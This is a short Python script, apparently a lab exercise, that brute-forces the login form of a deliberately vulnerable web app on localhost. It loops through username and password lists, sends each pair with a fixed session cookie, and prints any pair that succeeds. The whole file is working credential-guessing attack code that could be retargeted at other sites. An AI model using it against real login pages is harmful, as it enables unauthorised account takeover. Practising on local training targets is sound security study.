import requests

# Cargar lista de usuarios y contraseñas
with open('users.txt', 'r') as users_file:
    users = [line.strip() for line in users_file]

with open('passwords.txt', 'r') as passwords_file:
    passwords = [line.strip() for line in passwords_file]

url = 'http://localhost:8080/vulnerabilities/brute/'
cookies = {'PHPSESSID': '7p3pfd28ovji9g4vahhbhb0bo4', 'security': 'low'}

for user in users:
    for password in passwords:
        data = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        response = requests.get(url, params=data, cookies=cookies)

        if "Welcome to the password protected area" in response.text:
            print(f"¡Credenciales encontradas! Usuario: {user}, Contraseña: {password}")
            break
        else:
            print(f"Intento fallido con {user}:{password}")
